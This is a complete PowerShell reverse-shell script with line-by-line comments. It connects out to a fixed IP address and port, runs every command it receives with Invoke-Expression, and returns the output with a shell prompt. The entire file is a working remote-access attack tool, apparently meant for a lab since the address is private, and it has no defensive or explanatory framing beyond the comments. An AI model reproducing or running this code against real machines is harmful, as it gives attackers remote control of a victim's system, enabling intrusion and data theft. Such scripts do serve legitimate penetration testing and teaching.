# Define TCP client and establish connection
$client = New-Object System.Net.Sockets.TCPClient("192.168.23.158", 7777)
$stream = $client.GetStream()

# Initialize byte array to store incoming data
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

# Continuously read data from the network stream
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Convert received bytes to string
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute received data as PowerShell command and capture output
    $sendback = (iex $data 2>&1 | Out-String)
    
    # Format output with PowerShell prompt
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    
    # Convert output string to bytes
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    
    # Send output back to TCP client
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# Close TCP client connection
$client.Close()
